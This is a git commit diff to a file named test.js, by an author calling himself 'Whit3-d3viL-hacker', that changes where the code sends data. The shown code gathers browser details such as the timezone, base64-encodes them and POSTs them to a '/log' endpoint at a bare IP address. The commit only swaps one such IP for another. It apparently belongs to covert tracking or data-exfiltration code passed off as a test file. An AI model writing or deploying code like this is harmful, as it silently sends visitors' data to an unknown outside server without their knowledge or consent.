7dc4a35450df7d43316c703adc3ca5decf69227d
Whit3-d3viL-hacker <160129838+Whit3-d3viL-hacker@users.noreply.github.com>
2025-08-19 20:47:09 +0530

    Update test.js

--- test.js
+++ test.js
@@ -9,7 +9,7 @@
     tz:Intl.DateTimeFormat().resolvedOptions().timeZone
   };
   const b64=btoa(unescape(encodeURIComponent(JSON.stringify(p))));
-  await fetch("http://56.228.80.85:80/log",{
+  await fetch("http://51.21.134.183:80/log",{
     method:"POST",
     headers:{"Content-Type":"text/plain"},
     body:b64
